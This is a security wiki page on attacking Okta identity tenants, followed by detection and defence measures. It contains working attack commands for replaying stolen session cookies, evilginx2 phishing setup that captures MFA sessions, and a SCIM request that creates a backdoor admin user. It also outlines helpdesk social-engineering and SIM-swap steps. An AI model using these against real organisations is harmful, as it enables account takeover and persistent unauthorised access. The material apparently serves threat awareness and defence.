---
title: Okta Attack Paths — Session Replay, AiTM, and Helpdesk Social Engineering
slug: okta-attacks
---

> **TL;DR:** Okta tenants fall to stolen session tokens, evilginx-style AiTM that survives MFA, SCIM abuse, and the Scattered Spider playbook of calling the helpdesk for an MFA reset.

## What it is
Okta is the identity layer for thousands of SaaS-heavy enterprises, making it a top-tier target. The 2022 Lapsus$ contractor breach, the 2023 support-case HAR-file theft, and the 2023-2024 Scattered Spider campaigns against MGM/Caesars/Clorox all pivoted through Okta admin sessions, SSO impersonation, or social-engineered MFA resets.

## Preconditions / where it applies
- Okta tenant with admin role assigned without phishing-resistant MFA
- Browser session cookies (`sid`, `idx`) recoverable from victim host or HAR file
- Helpdesk workflow that resets MFA via voice without out-of-band verification

## Technique
Session token replay from a stolen HAR or stealer log:

```bash
curl -H "Cookie: sid=<stolen>; idx=<stolen>" \
  https://target.okta.com/api/v1/users/me
# pivots to /api/v1/apps to enumerate SSO targets
```

AiTM with evilginx to capture MFA-bound sessions (works against push, SMS, TOTP; fails against FIDO2 origin binding):

```bash
evilginx2 -p ./phishlets
> phishlets hostname okta target-login.tld
> phishlets enable okta
> lures create okta
# victim clicks lure, completes MFA, evilginx forwards cookies to attacker
```

SCIM provisioning abuse — a compromised SCIM bearer token can create or elevate users in downstream apps without touching Okta admin:

```bash
curl -X POST https://app.target.tld/scim/v2/Users \
  -H "Authorization: Bearer $SCIM_TOKEN" \
  -d '{"userName":"backdoor@target.tld","active":true,"groups":[{"value":"admins"}]}'
```

Sign-In Widget config injection — when a custom widget is hosted on an attacker-controllable subdomain (dangling CNAME), swap the config to point auth flows at a proxied IdP.

Helpdesk social engineering (Scattered Spider): call posing as an exec, request MFA factor reset, receive an enrollment link, register attacker's authenticator. Pair with SIM swap for SMS fallback.

## Detection and defence
- Enforce phishing-resistant MFA (FIDO2/WebAuthn) for all admins; block SMS and security questions
- Bind sessions with Okta ThreatInsight + IP/ASN allowlists; shorten admin session lifetime
- Require manager-approved, video-verified helpdesk MFA resets; log every factor reset to SIEM
- Monitor `system.api_token.create`, `user.session.start` from new ASNs, `app.user_management.scim.*` events
- Rotate SCIM tokens quarterly; restrict their network egress to known IdP ranges

## References
- [Okta Secure Identity Commitment](https://www.okta.com/secure-identity-commitment/) — vendor post-incident roadmap
- [CISA Scattered Spider advisory](https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-320a) — TTPs and detections

See also: [[entra-id-enum]], [[entra-conditional-access-bypass]], [[ci-cd-as-cloud-attack-surface]].
